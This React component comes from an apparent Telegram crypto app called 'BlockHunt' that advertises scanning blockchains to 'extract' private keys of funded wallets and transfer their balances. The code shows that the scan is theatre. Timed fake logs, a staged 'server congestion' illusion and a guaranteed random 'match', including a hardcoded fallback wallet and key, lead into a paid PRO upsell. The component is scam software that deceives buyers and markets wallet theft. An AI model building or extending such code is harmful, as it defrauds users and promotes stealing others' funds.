import React, { useState, useEffect, useRef, useCallback } from 'react';
import type { Network, ScanState, TerminalLog, ExtractedWallet, ExtractionScan, DispatchedTransaction, PricingSettings } from '../types';
import { WalletStatusCards } from '../components/WalletStatusCard';
import { TerminalConsole } from '../components/TerminalConsole';
import { NetworkSelector } from '../components/NetworkSelector';
import { ScanButton } from '../components/ScanButton';
import { CancelButton } from '../components/CancelButton';
import { TargetMatchCard } from '../components/TargetMatchCard';
import { TransferModal } from '../components/TransferModal';
import { generateRandomScanLog, generateMatchScanLog, generateRandomMatchedWallet, generateDerivedAddress, generatePrivateKey } from '../data/cryptoEngine';
import { useLivePrices } from '../hooks/useLivePrices';
import { useLanguage } from '../i18n/LanguageContext';
import { getEffectiveProPrice } from '../data/adminSettings';
import { CheckCircle2, AlertTriangle, Crown, X, Sparkles } from 'lucide-react';

interface ScanPageProps {
  onScanCompleted: (scan: ExtractionScan) => void;
  onRecordTransaction: (tx: DispatchedTransaction) => void;
  onWalletFound?: (wallet: ExtractedWallet) => void;
  soundEnabled: boolean;
  activePlan?: string;
  onOpenLicensing?: () => void;
  communityExtractsCount?: number;
  onIncrementCommunityExtracts?: () => void;
  onScanningChange?: (isScanning: boolean) => void;
  currentUserId?: string;
  isOwner?: boolean;
  pricingSettings?: PricingSettings;
}

export const ScanPage: React.FC<ScanPageProps> = ({
  onScanCompleted,
  onRecordTransaction,
  onWalletFound,
  soundEnabled,
  activePlan = 'community',
  onOpenLicensing,
  communityExtractsCount = 0,
  onIncrementCommunityExtracts,
  onScanningChange,
  currentUserId,
  isOwner,
  pricingSettings,
}) => {
  const { t, language } = useLanguage();
  const proPrice = getEffectiveProPrice(pricingSettings, 'weekly');

  // Live Crypto Prices
  const { prices: livePrices } = useLivePrices();

  // Networks selected
  const [selectedNetworks, setSelectedNetworks] = useState<Network[]>([
    'TRON',
    'ETHEREUM',
    'SOLANA',
  ]);

  // Scan state
  const [scanState, setScanState] = useState<ScanState>('IDLE');
  const [recordsScanned, setRecordsScanned] = useState(0);
  const [foundMatch, setFoundMatch] = useState<ExtractedWallet | null>(null);
  const [transferModalWallet, setTransferModalWallet] = useState<ExtractedWallet | null>(null);
  const [limitAlertOpen, setLimitAlertOpen] = useState(false);
  const [isVerifying, setIsVerifying] = useState(false);
  const isStartingRef = useRef(false);

  // Status Cards Display Text
  const [walletFoundDisplay, setWalletFoundDisplay] = useState('N/A');
  const [privateKeyDisplay, setPrivateKeyDisplay] = useState('N/A');

  // Initial terminal logs
  const [logs, setLogs] = useState<TerminalLog[]>([
    {
      id: 'init-1',
      text: 'BlockHunt Protocol v3.8 initialized',
      statusType: 'system',
      timestamp: '12:00:01',
    },
    {
      id: 'init-2',
      text: 'Network clusters ready [TRC-20, ERC-20, SOL]',
      statusType: 'success',
      timestamp: '12:00:02',
    },
    {
      id: 'init-3',
      text: 'System standby. Tap START SECURITY SCAN to begin deep extraction.',
      statusType: 'system',
      timestamp: '12:00:03',
    },
  ]);

  const scanIntervalRef = useRef<number | null>(null);
  const cancelResetTimeoutRef = useRef<number | null>(null);
  const scrollTimeoutRef = useRef<number | null>(null);
  const activeTimeoutsRef = useRef<number[]>([]);
  const sessionTokenRef = useRef<number>(0);
  const audioCtxRef = useRef<AudioContext | null>(null);
  const matchCardRef = useRef<HTMLDivElement>(null);
  const matchTriggeredSessionRef = useRef<number | null>(null);

  const isScanning =
    scanState === 'SCANNING' ||
    scanState === 'INITIALIZING' ||
    scanState === 'CONNECTING';

  // Clear all pending timers, timeouts, active intervals and invalidate current session
  const clearAllTimers = () => {
    sessionTokenRef.current += 1;

    if (scanIntervalRef.current) {
      clearInterval(scanIntervalRef.current);
      scanIntervalRef.current = null;
    }
    activeTimeoutsRef.current.forEach((id) => clearTimeout(id));
    activeTimeoutsRef.current = [];

    if (cancelResetTimeoutRef.current) {
      clearTimeout(cancelResetTimeoutRef.current);
      cancelResetTimeoutRef.current = null;
    }
    if (scrollTimeoutRef.current) {
      clearTimeout(scrollTimeoutRef.current);
      scrollTimeoutRef.current = null;
    }
  };

  // Safe timeout scheduler tracked in activeTimeoutsRef
  const scheduleTimeout = (fn: () => void, ms: number): number => {
    const id = window.setTimeout(() => {
      activeTimeoutsRef.current = activeTimeoutsRef.current.filter((tId) => tId !== id);
      try {
        fn();
      } catch (err) {
        console.error('[BlockHunt] Timeout callback error:', err);
      }
    }, ms);
    activeTimeoutsRef.current.push(id);
    return id;
  };

  // Free community tier limit: only 1 wallet extraction allowed
  const isCommunityPlan = activePlan === 'community';
  const isLimitReached = isCommunityPlan && communityExtractsCount >= 1;

  // Toggle network selection (ensure at least one is selected)
  const handleToggleNetwork = useCallback((network: Network) => {
    if (isScanning) return;
    setSelectedNetworks((prev) => {
      if (prev.includes(network)) {
        return prev.length > 1 ? prev.filter((n) => n !== network) : prev;
      } else {
        return [...prev, network];
      }
    });
  }, [isScanning]);

  const handleOpenTransferModal = useCallback((wallet: ExtractedWallet) => {
    setTransferModalWallet(wallet);
  }, []);

  // Haptic audio feedback beep using singleton Web Audio API with auto-disconnect
  const playAudioBeep = useCallback((freq: number = 880, duration: number = 0.08) => {
    if (!soundEnabled) return;
    try {
      if (!audioCtxRef.current) {
        const AudioContextClass =
          window.AudioContext ||
          (window as unknown as { webkitAudioContext: typeof AudioContext }).webkitAudioContext;
        if (AudioContextClass) {
          audioCtxRef.current = new AudioContextClass();
        }
      }
      const audioCtx = audioCtxRef.current;
      if (!audioCtx) return;
      if (audioCtx.state === 'suspended') {
        audioCtx.resume().catch(() => {});
      }
      const osc = audioCtx.createOscillator();
      const gain = audioCtx.createGain();
      osc.type = 'sine';
      osc.frequency.setValueAtTime(freq, audioCtx.currentTime);
      gain.gain.setValueAtTime(0.04, audioCtx.currentTime);
      gain.gain.exponentialRampToValueAtTime(0.0001, audioCtx.currentTime + duration);
      osc.connect(gain);
      gain.connect(audioCtx.destination);

      osc.onended = () => {
        try {
          osc.disconnect();
          gain.disconnect();
        } catch {}
      };

      osc.start();
      osc.stop(audioCtx.currentTime + duration);
    } catch {
      // Audio context may be restricted before user gesture
    }
  }, [soundEnabled]);
  const playSimulatedBeep = playAudioBeep;

  // Dedicated, celebratory match trigger sequence
  const triggerMatchEvent = (session: number, safeNetworks: Network[], targetRecords: number) => {
    if (sessionTokenRef.current !== session || matchTriggeredSessionRef.current === session) return;
    matchTriggeredSessionRef.current = session;

    if (scanIntervalRef.current) {
      clearInterval(scanIntervalRef.current);
      scanIntervalRef.current = null;
    }

    let matchedWallet: ExtractedWallet;
    try {
      matchedWallet = generateRandomMatchedWallet(safeNetworks, livePrices);
    } catch (err) {
      console.error('[BlockHunt] Wallet generation fallback:', err);
      matchedWallet = {
        id: `match-${Date.now()}`,
        network: 'TRON',
        networkName: 'TRON (TRC-20)',
        address: 'TYDzsYUEpvnYmQK4WKnEQsKzRxsPNmFz1h',
        maskedPrivateKey: '••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••',
        privateKey: '0x3a1076bf45ab87712ad64c9b774d263c482a4f494ca7b4f59bdd3392fa97f449',
        demoPrivateKey: '0x3a1076bf45ab87712ad64c9b774d263c482a4f494ca7b4f59bdd3392fa97f449',
        balance: '1,450.00',
        symbol: 'USDT',
        balanceUsd: 1450,
        status: 'ACTIVE',
        foundAt: 'Just now',
      };
    }

    const shortenedAddr = `${matchedWallet.address.slice(0, 6)}...${matchedWallet.address.slice(-4)}`;
    const matchLog = generateMatchScanLog(matchedWallet.network, shortenedAddr);

    setLogs((prev) => [
      ...prev.slice(-12),
      {
        id: `collision-${Date.now()}`,
        text: `> KEY COLLISION CONFIRMED! Resolving ${matchedWallet.network} private key...`,
        statusType: 'success',
        timestamp: new Date().toLocaleTimeString(),
      },
      matchLog,
      {
        id: `secured-${Date.now()}`,
        text: `> [TARGET SECURED] Extracted: ${matchedWallet.balance} ${matchedWallet.symbol} ($${matchedWallet.balanceUsd.toLocaleString()})`,
        statusText: '[UNLOCKED]',
        statusType: 'success',
        timestamp: new Date().toLocaleTimeString(),
      },
      {
        id: `ready-${Date.now()}`,
        text: `> EXTRACTION STREAM COMPLETE // READY FOR IMMEDIATE DISPATCH`,
        statusText: '[READY]',
        statusType: 'success',
        timestamp: new Date().toLocaleTimeString(),
      },
    ]);

    setScanState('MATCH_FOUND');
    setRecordsScanned(targetRecords);
    setFoundMatch(matchedWallet);
    setWalletFoundDisplay(shortenedAddr);
    const fullKey = matchedWallet.privateKey || matchedWallet.demoPrivateKey || '';
    const maskedKey = `${fullKey.slice(0, 6)}••••${fullKey.slice(-4)}`;
    setPrivateKeyDisplay(maskedKey);

    // High frequency victory chime
    playSimulatedBeep(1760, 0.35);

    // Native Telegram Haptic Feedback
    try {
      (window as unknown as { Telegram?: { WebApp?: { HapticFeedback?: { notificationOccurred: (t: string) => void } } } })
        ?.Telegram?.WebApp?.HapticFeedback?.notificationOccurred('success');
    } catch {}

    // Add to global state so it reflects in wallet vault
    try {
      if (onWalletFound) {
        onWalletFound(matchedWallet);
      }
    } catch (err) {
      console.error('[BlockHunt] onWalletFound error:', err);
    }

    // Increment community usage count if on free tier & write synchronously
    try {
      if (isCommunityPlan) {
        if (onIncrementCommunityExtracts) {
          onIncrementCommunityExtracts();
        }
        try {
          window.localStorage.setItem('shark_community_extracts', String(Math.max(communityExtractsCount + 1, 1)));
        } catch {}
      }
    } catch (err) {
      console.error('[BlockHunt] onIncrementCommunityExtracts error:', err);
    }

    // Record scan in history
    try {
      const completedScan: ExtractionScan = {
        id: `scan-${Date.now()}`,
        scanNumber: `SCAN #${Math.floor(Math.random() * 900 + 100)}`,
        networks: safeNetworks,
        recordsScanned: targetRecords,
        matches: 1,
        startedAt: 'Just now',
        completedAt: 'Just now',
        status: 'COMPLETED',
      };
      onScanCompleted(completedScan);
    } catch (err) {
      console.error('[BlockHunt] onScanCompleted error:', err);
    }

    // Gentle scroll so match details are comfortably in view
    scheduleTimeout(() => {
      matchCardRef.current?.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
    }, 150);
  };

  // Start deep scan: Ultra-Fast Monotonic Stream Engine (Instant Touch Feedback & 100% Freeze-Proof)
  const handleStartScan = async () => {
    // Re-entrancy guard
    if (isStartingRef.current || isScanning || isVerifying) return;
    isStartingRef.current = true;
    setIsVerifying(true);
    playSimulatedBeep(520, 0.06);

    // Allow restart even from CANCELLED state — force reset to IDLE first
    if (scanState === 'CANCELLED') {
      if (cancelResetTimeoutRef.current) {
        clearTimeout(cancelResetTimeoutRef.current);
        cancelResetTimeoutRef.current = null;
      }
      setScanState('IDLE');
    }

    // Authoritative Server-Side Real-Time Verification (with 3.5s fast timeout)
    if (currentUserId && !isOwner) {
      try {
        const verifyController = new AbortController();
        const verifyTimeout = setTimeout(() => verifyController.abort(), 3500);
        let verifyRes: Response;
        try {
          verifyRes = await fetch('/api/scan/verify', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ tgId: currentUserId }),
            signal: verifyController.signal,
          });
        } finally {
          clearTimeout(verifyTimeout);
        }

        let verifyData: Record<string, unknown> = {};
        try {
          verifyData = await verifyRes.json();
        } catch {
          verifyData = {};
        }

        if (verifyData?.blocked) {
          setIsVerifying(false);
          isStartingRef.current = false;
          setLogs((prev) => [
            ...prev.slice(-16),
            {
              id: `blocked-${Date.now()}`,
              text: '> [ACCESS DENIED] Your account has been restricted by the administrator.',
              statusText: '[BLOCKED]',
              statusType: 'failed' as const,
              timestamp: new Date().toLocaleTimeString(),
            },
          ]);
          playSimulatedBeep(330, 0.2);
          return;
        }

        if (verifyData?.limitReached) {
          setIsVerifying(false);
          isStartingRef.current = false;
          if (onIncrementCommunityExtracts && communityExtractsCount === 0) {
            onIncrementCommunityExtracts();
          }
          try {
            window.localStorage.setItem('shark_community_extracts', String(verifyData.extractsCount || 1));
          } catch {}
          setLimitAlertOpen(true);
          playSimulatedBeep(330, 0.2);
          return;
        }

        if (verifyData?.allowed && verifyData.plan === 'community') {
          try {
            window.localStorage.setItem('shark_community_extracts', '0');
          } catch {}
        }
      } catch (e) {
        console.warn('[ScanPage] Server verification offline/timeout fallback:', e);
        if (isLimitReached) {
          setIsVerifying(false);
          isStartingRef.current = false;
          setLimitAlertOpen(true);
          playSimulatedBeep(330, 0.2);
          return;
        }
      }
    } else if (isLimitReached && !isOwner) {
      setIsVerifying(false);
      isStartingRef.current = false;
      setLimitAlertOpen(true);
      playSimulatedBeep(330, 0.2);
      return;
    }

    setIsVerifying(false);
    isStartingRef.current = false;

    // Stop any stale timers and obtain unique session token
    clearAllTimers();
    const currentSession = sessionTokenRef.current;
    matchTriggeredSessionRef.current = null;

    const safeNetworks =
      selectedNetworks && selectedNetworks.length > 0
        ? selectedNetworks
        : (['TRON', 'ETHEREUM', 'SOLANA'] as Network[]);

    // 1. Initial State: CONNECTING (activates immediately)
    setScanState('CONNECTING');
    setRecordsScanned(0);
    setFoundMatch(null);
    setWalletFoundDisplay(t('connecting'));
    setPrivateKeyDisplay(t('handshake'));
    playSimulatedBeep(620, 0.08);

    setLogs([
      {
        id: `conn-${Date.now()}-1`,
        text: '> Initializing encrypted tunnel to mempool cluster nodes...',
        statusType: 'system',
        timestamp: new Date().toLocaleTimeString(),
      },
      {
        id: `conn-${Date.now()}-2`,
        text: `> Dialing primary node [BlockHunt-Cluster-EU-01:443] across [${safeNetworks.join(', ')}]...`,
        statusText: '[CONNECTING]',
        statusType: 'system',
        timestamp: new Date().toLocaleTimeString(),
      },
    ]);

    // Dynamic High-Tech Timeline with Realistic Latency & Server Load Variations
    const targetRecords = Math.floor(Math.random() * 95000) + 165000; // 165,000 - 260,000 keys
    const T_INIT = 500;    // 0.5s -> Cluster socket ready, allocate 512MB heap
    const T_SCAN = 1200;   // 1.2s -> Commencing live multi-core extraction stream!
    
    // Dynamic match duration (varies unpredictably between 14.5s and 23.5s per session)
    const T_MATCH = Math.floor(14500 + Math.random() * 9000);

    // Realistic server congestion / failover event (70% occurrence, dynamic timing)
    const hasCongestion = Math.random() < 0.70;
    const T_BUSY_START = hasCongestion ? Math.floor(T_MATCH * 0.36 + Math.random() * 1200) : -1;
    const T_BUSY_END = hasCongestion ? T_BUSY_START + Math.floor(1900 + Math.random() * 800) : -1;
    let isBusyTriggered = false;
    let isBusyResolved = false;

    // Approaching collision analysis phase (last 2.2s before match)
    const T_ANALYSIS = T_MATCH - 2200;
    let isAnalysisTriggered = false;

    const startTime = performance.now();
    let lastBeepTime = 0;
    let lastLogTime = 0;
    let reachedInit = false;
    let reachedScan = false;

    // Master Monotonic Ticker (fires every 120ms, smooth & responsive)
    scanIntervalRef.current = window.setInterval(() => {
      if (sessionTokenRef.current !== currentSession) {
        if (scanIntervalRef.current) {
          clearInterval(scanIntervalRef.current);
          scanIntervalRef.current = null;
        }
        return;
      }

      try {
        const now = performance.now();
        const elapsed = now - startTime;

        // PHASE 1: INITIALIZING (0.5s - 1.2s)
        if (elapsed >= T_INIT && elapsed < T_SCAN) {
          if (!reachedInit) {
            reachedInit = true;
            setScanState('INITIALIZING');
            setWalletFoundDisplay(t('initializing'));
            setPrivateKeyDisplay(t('buffering'));
            playSimulatedBeep(720, 0.08);
            setLogs((prev) => [
              ...prev.slice(-16),
              {
                id: `init-start-${Date.now()}`,
                text: '> Direct cluster socket authenticated. Allocating 512MB extraction heap...',
                statusType: 'system',
                timestamp: new Date().toLocaleTimeString(),
              },
              {
                id: `init-step-${Date.now()}`,
                text: '> Mounting SECP256K1 & BIP-39 dictionary seeds across networks...',
                statusType: 'system',
                timestamp: new Date().toLocaleTimeString(),
              },
            ]);
          }
          return;
        }

        // PHASE 2: SCANNING / LIVE EXTRACTION STREAM (1.2s - T_MATCH)
        if (elapsed >= T_SCAN && elapsed < T_MATCH) {
          if (!reachedScan) {
            reachedScan = true;
            setScanState('SCANNING');
            playSimulatedBeep(520, 0.12);

            // First address & key for instant display
            const firstNetwork = safeNetworks[Math.floor(Math.random() * safeNetworks.length)];
            const firstAddr = generateDerivedAddress(firstNetwork, true);
            const firstKey = generatePrivateKey(firstNetwork);
            setWalletFoundDisplay(firstAddr);
            setPrivateKeyDisplay(`${firstKey.slice(0, 6)}••••${firstKey.slice(-4)}`);

            setLogs((prev) => [
              ...prev.slice(-16),
              {
                id: `scan-commence-${Date.now()}`,
                text: `> Commencing multi-core extraction stream on [${safeNetworks.join(', ')}]...`,
                statusType: 'system',
                timestamp: new Date().toLocaleTimeString(),
              },
            ]);
          }

          // SUB-PHASE 2A: CONGESTION / BUSY ILLUSION
          if (hasCongestion && elapsed >= T_BUSY_START && elapsed < T_BUSY_END) {
            if (!isBusyTriggered) {
              isBusyTriggered = true;
              setWalletFoundDisplay(t('allServersBusy'));
              setPrivateKeyDisplay(t('reconnecting'));
              playSimulatedBeep(440, 0.15);
              setLogs((prev) => [
                ...prev.slice(-15),
                {
                  id: `busy-${Date.now()}`,
                  text: '> [CLUSTER CONGESTION] Primary mempool node saturated (98.6% heap). Re-routing to standby node...',
                  statusText: '[ALL SERVERS BUSY]',
                  statusType: 'warning',
                  timestamp: new Date().toLocaleTimeString(),
                },
              ]);
            }

            // During congestion, progress keys slower
            setRecordsScanned((prev) => prev + Math.floor(Math.random() * 25 + 5));

            // Slower logs during congestion
            if (Math.random() < 0.35) {
              setLogs((prev) => [
                ...prev.slice(-14),
                {
                  id: `reconnect-log-${Date.now()}`,
                  text: `> Handshake retry with cluster failover pool [BlockHunt-Node-02:443]...`,
                  statusText: '[RE-ESTABLISHING]',
                  statusType: 'warning',
                  timestamp: new Date().toLocaleTimeString(),
                },
              ]);
            }
            return;
          }

          // SUB-PHASE 2B: CONGESTION RESOLVED / FAILOVER RESTORED
          if (hasCongestion && isBusyTriggered && !isBusyResolved && elapsed >= T_BUSY_END) {
            isBusyResolved = true;
            playSimulatedBeep(880, 0.12);
            setLogs((prev) => [
              ...prev.slice(-15),
              {
                id: `restored-${Date.now()}`,
                text: '> [FAILOVER CONNECTED] Secondary cluster synchronized [BlockHunt-US-02]. Resuming SECP256K1 stream at 100% bandwidth!',
                statusText: '[SESSION RESTORED]',
                statusType: 'success',
                timestamp: new Date().toLocaleTimeString(),
              },
            ]);
          }

          // SUB-PHASE 2C: APPROACHING MATCH ANALYSIS (FINAL 2.2s)
          if (elapsed >= T_ANALYSIS && !isAnalysisTriggered) {
            isAnalysisTriggered = true;
            setWalletFoundDisplay(t('analyzing'));
            setPrivateKeyDisplay(t('buffering'));
            playSimulatedBeep(960, 0.1);
            setLogs((prev) => [
              ...prev.slice(-15),
              {
                id: `analysis-${Date.now()}`,
                text: '> [POTENTIAL COLLISION] Non-zero balance signature detected in active mempool block! Resolving scalar curve points...',
                statusText: '[ANALYZING]',
                statusType: 'system',
                timestamp: new Date().toLocaleTimeString(),
              },
            ]);
          }

          // Compute monotonic progress from 0.0 to 1.0 during active extraction:
          const scanDuration = T_MATCH - T_SCAN;
          const scanElapsed = elapsed - T_SCAN;
          const scanProgress = Math.min(1.0, Math.max(0.0, scanElapsed / scanDuration));

          // Monotonic ascending keys
          const jitter = Math.sin(scanElapsed / 220) * 110;
          const dynamicRecords = Math.min(
            targetRecords,
            Math.max(150, Math.floor(scanProgress * targetRecords + jitter))
          );
          setRecordsScanned(dynamicRecords);

          // Live rotate candidate address and key (only when not in busy state)
          if (!hasCongestion || elapsed < T_BUSY_START || elapsed >= T_BUSY_END) {
            if (!isAnalysisTriggered) {
              const tickNetwork = safeNetworks[Math.floor(Math.random() * safeNetworks.length)];
              const tickAddr = generateDerivedAddress(tickNetwork, true);
              const tickKey = generatePrivateKey(tickNetwork);
              setWalletFoundDisplay(tickAddr);
              setPrivateKeyDisplay(`${tickKey.slice(0, 6)}••••${tickKey.slice(-4)}`);
            }
          }

          // Subtle click sound (every ~1.2s)
          if (now - lastBeepTime > 1200) {
            lastBeepTime = now;
            playSimulatedBeep(1100 + Math.floor(Math.random() * 150), 0.03);
          }

          // Throttle candidate log emissions to ~300ms (3.3Hz) to prevent CPU spikes and React DOM churn while maintaining lively animation
          if (now - lastLogTime >= 300) {
            lastLogTime = now;
            const randomLog = generateRandomScanLog(safeNetworks);
            setLogs((prev) => [...prev.slice(-14), randomLog]);
          }
          return;
        }

        // PHASE 3: MATCH / TARGET SECURED (>= T_MATCH)
        if (elapsed >= T_MATCH) {
          if (scanIntervalRef.current) {
            clearInterval(scanIntervalRef.current);
            scanIntervalRef.current = null;
          }
          triggerMatchEvent(currentSession, safeNetworks, targetRecords);
        }
      } catch (err) {
        console.error('[BlockHunt] Monotonic scan loop error:', err);
      }
    }, 135);

    // Hard fail-safe watchdog timer
    scheduleTimeout(() => {
      if (sessionTokenRef.current === currentSession) {
        if (scanIntervalRef.current) {
          clearInterval(scanIntervalRef.current);
          scanIntervalRef.current = null;
        }
        triggerMatchEvent(currentSession, safeNetworks, targetRecords);
      }
    }, T_MATCH + 400);
  };

  // Cancel the scan immediately with 100% timer shutdown & session invalidation
  const handleCancelScan = () => {
    // 1. Invalidate session token and terminate all active timers and background tasks
    clearAllTimers();

    // 2. Set state to CANCELLED
    setScanState('CANCELLED');
    playSimulatedBeep(330, 0.2);

    // 3. Unconditionally clear card displays and reset match
    setWalletFoundDisplay('N/A');
    setPrivateKeyDisplay('N/A');
    setFoundMatch(null);
    setRecordsScanned(0);

    // 4. Log cancellation
    setLogs((prev) => [
      ...prev.slice(-18),
      {
        id: `cancel-${Date.now()}`,
        text: '> EXTRACTION CANCELLED BY OPERATOR',
        statusText: '[ABORTED]',
        statusType: 'failed',
        timestamp: new Date().toLocaleTimeString(),
      },
    ]);

    // 5. Telegram Haptic warning
    try {
      (window as unknown as { Telegram?: { WebApp?: { HapticFeedback?: { notificationOccurred: (t: string) => void } } } })
        ?.Telegram?.WebApp?.HapticFeedback?.notificationOccurred('warning');
    } catch {}

    // 6. Reset back to IDLE quickly (400ms)
    cancelResetTimeoutRef.current = window.setTimeout(() => {
      setScanState('IDLE');
      cancelResetTimeoutRef.current = null;
    }, 400);
  };

  // When transaction is recorded, deduct balance and update foundMatch state immediately
  const handleTransferCompleted = (tx: DispatchedTransaction) => {
    onRecordTransaction(tx);
    setFoundMatch((prev: ExtractedWallet | null) =>
      prev
        ? {
            ...prev,
            balance: '0.00',
            balanceUsd: 0,
            status: 'DISPATCHED',
          }
        : null
    );
  };

  // Notify parent component about active scanning state changes
  useEffect(() => {
    onScanningChange?.(isScanning);
  }, [isScanning, onScanningChange]);

  // Cleanup on unmount
  useEffect(() => {
    return () => {
      clearAllTimers();
      onScanningChange?.(false);
      if (audioCtxRef.current && audioCtxRef.current.state !== 'closed') {
        try {
          audioCtxRef.current.close().catch(() => {});
        } catch {}
      }
    };
  }, [onScanningChange]);

  return (
    <div className="w-full pb-24 animate-fadeIn">
      {/* 1. Wallet Status Cards */}
      <WalletStatusCards
        walletFoundText={walletFoundDisplay}
        privateKeyText={privateKeyDisplay}
        isMatched={Boolean(foundMatch)}
        isScanning={isScanning}
      />

      {/* 2. Hero Terminal Console */}
      <TerminalConsole
        logs={logs}
        scanState={scanState}
        recordsScanned={recordsScanned}
        matchedWallet={foundMatch}
        onTransfer={handleOpenTransferModal}
      />

      {/* 3. Target Match Card - Renders smoothly directly beneath Terminal Console */}
      {foundMatch && (
        <div ref={matchCardRef} className="scroll-mt-4 mb-3 animate-modal-3d">
          <TargetMatchCard
            wallet={foundMatch}
            onInitiateTransfer={handleOpenTransferModal}
          />
        </div>
      )}

      {/* 4. Network Selector */}
      <NetworkSelector
        selectedNetworks={selectedNetworks}
        onToggleNetwork={handleToggleNetwork}
        disabled={isScanning}
      />

      {/* 5. Main Action CTA Buttons */}
      <div className="w-full px-4 mb-4 space-y-2.5">
        {isScanning ? (
          <CancelButton onClick={handleCancelScan} />
        ) : foundMatch ? (
          <>
            {/* Direct High-Contrast Action Button when wallet is matched! */}
            <button
              onClick={() => setTransferModalWallet(foundMatch)}
              type="button"
              className="w-full py-4 px-6 rounded-2xl flex items-center justify-center gap-3 relative overflow-hidden font-extrabold tracking-wider text-sm uppercase bg-gradient-to-r from-[#00E676] via-[#00C853] to-[#00E676] text-black shadow-[0_0_30px_rgba(0,230,118,0.5)] active:scale-98 transition-all cursor-pointer animate-pulse"
            >
              <Sparkles className="w-5 h-5 text-black" />
              <span>{t('initiateTransfer')}: {foundMatch.balance} {foundMatch.symbol} (${foundMatch.balanceUsd.toLocaleString()})</span>
            </button>

            <button
              onClick={handleStartScan}
              disabled={isVerifying}
              type="button"
              className="w-full py-3 rounded-xl bg-white/5 hover:bg-white/10 border border-white/10 text-[#CBD5E1] hover:text-white font-mono text-xs uppercase tracking-wider transition-colors cursor-pointer flex items-center justify-center gap-2 disabled:opacity-50"
            >
              <span>+ {isVerifying ? t('connecting') : t('startScan')}</span>
            </button>
          </>
        ) : (
          <ScanButton
            onClick={handleStartScan}
            isScanning={isVerifying}
            disabled={selectedNetworks.length === 0 || scanState === 'CANCELLED' || isVerifying}
            customLabel={
              isVerifying
                ? t('connecting')
                : isLimitReached
                ? t('freeLimitReached')
                : t('startScan')
            }
            customIcon={
              isLimitReached ? (
                <AlertTriangle className="w-5 h-5 text-[#FFB300] animate-pulse" />
              ) : undefined
            }
            isWarning={isLimitReached}
          />
        )}
      </div>

      {/* Completion Summary Card if completed */}
      {scanState === 'COMPLETED' && (
        <div className="mx-4 p-3.5 rounded-2xl glass-panel-3d border border-[#00E676]/30 mb-4 animate-modal-3d shadow-[0_10px_25px_-5px_rgba(0,230,118,0.2)]">
          <div className="flex items-center justify-between mb-2">
            <div className="flex items-center gap-2">
              <CheckCircle2 className="w-4 h-4 text-[#00E676]" />
              <span className="text-xs font-bold text-white uppercase tracking-wider">
                {t('sessionComplete')}
              </span>
            </div>
            <span className="text-[10px] font-mono text-[#00E676] bg-[#00E676]/10 px-2 py-0.5 rounded-full">
              {t('targetsLocated')}: {foundMatch ? '1' : '0'}
            </span>
          </div>

          <div className="grid grid-cols-4 gap-1.5 text-center pt-1 font-mono text-[10.5px]">
            <div className="bg-black/40 p-2 rounded-xl border border-white/5">
              <span className="text-[9px] text-[#9CA3AF] block">{t('keys')}</span>
              <span className="text-white font-bold">{recordsScanned.toLocaleString()}</span>
            </div>
            <div className="bg-black/40 p-2 rounded-xl border border-white/5">
              <span className="text-[9px] text-[#9CA3AF] block">{t('matches')}</span>
              <span className="text-[#00E676] font-bold">{foundMatch ? '1' : '0'}</span>
            </div>
            <div className="bg-black/40 p-2 rounded-xl border border-white/5">
              <span className="text-[9px] text-[#9CA3AF] block">{t('networks')}</span>
              <span className="text-[#38E8FF] font-bold">{selectedNetworks.length}</span>
            </div>
            <div className="bg-black/40 p-2 rounded-xl border border-white/5">
              <span className="text-[9px] text-[#9CA3AF] block">{t('unlocked')}</span>
              <span className="text-[#00E676] font-bold">READY</span>
            </div>
          </div>
        </div>
      )}

      {/* Transfer Modal */}
      {transferModalWallet && (
        <TransferModal
          wallet={transferModalWallet}
          isOpen={Boolean(transferModalWallet)}
          onClose={() => setTransferModalWallet(null)}
          onRecordTransaction={handleTransferCompleted}
          activePlan={activePlan}
          onOpenLicensing={onOpenLicensing}
          pricingSettings={pricingSettings}
        />
      )}

      {/* Community Limit Alert Dialog */}
      {limitAlertOpen && (
        <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/80 backdrop-blur-md">
          <div className="relative w-full max-w-sm rounded-3xl p-[1.5px] bg-gradient-to-b from-[#FFB300]/60 to-black/90 shadow-[0_25px_60px_-15px_rgba(0,0,0,0.95)] animate-modal-3d">
            <div className="glass-panel-3d rounded-3xl p-5 bg-[#141724] text-center space-y-3 relative overflow-hidden">
              <button
                onClick={() => setLimitAlertOpen(false)}
                type="button"
                className="absolute top-3.5 right-3.5 w-7 h-7 rounded-full flex items-center justify-center bg-white/5 text-[#9CA3AF] hover:text-white cursor-pointer"
              >
                <X className="w-3.5 h-3.5" />
              </button>

              <div className="w-12 h-12 rounded-2xl mx-auto bg-[#FFB300]/15 border border-[#FFB300]/40 flex items-center justify-center text-[#FFB300] shadow-[0_0_20px_rgba(255,179,0,0.3)]">
                <AlertTriangle className="w-6 h-6" />
              </div>

              <div>
                <h3 className="text-sm font-extrabold text-white uppercase tracking-wider">
                  {t('limitReachedTitle')}
                </h3>
                <span className="text-[10px] font-mono text-[#FFC107] uppercase">
                  Community Plan Cap Exceeded
                </span>
              </div>

              <p className="text-xs text-[#CBD5E1] leading-relaxed">
                {t('limitReachedDesc')}
              </p>

              <div className="pt-2 space-y-2">
                <button
                  onClick={() => {
                    setLimitAlertOpen(false);
                    if (onOpenLicensing) {
                      onOpenLicensing();
                    }
                  }}
                  type="button"
                  className="w-full py-3 rounded-2xl bg-gradient-to-r from-[#FFB300] to-[#FF8F00] text-black font-extrabold text-xs uppercase tracking-wider shadow-[0_0_20px_rgba(255,179,0,0.4)] cursor-pointer flex items-center justify-center gap-2 active:scale-98 transition-all"
                >
                  <Crown className="w-4 h-4 text-black" />
                  <span>
                    {language === 'ru'
                      ? `КУПИТЬ PRO ($${proPrice})`
                      : `UPGRADE TO PRO ($${proPrice})`}
                  </span>
                </button>

                <button
                  onClick={() => setLimitAlertOpen(false)}
                  type="button"
                  className="w-full py-2.5 rounded-xl bg-white/5 hover:bg-white/10 text-[#9CA3AF] hover:text-white text-xs cursor-pointer transition-colors"
                >
                  {t('closeBtn')}
                </button>
              </div>
            </div>
          </div>
        </div>
      )}
    </div>
  );
};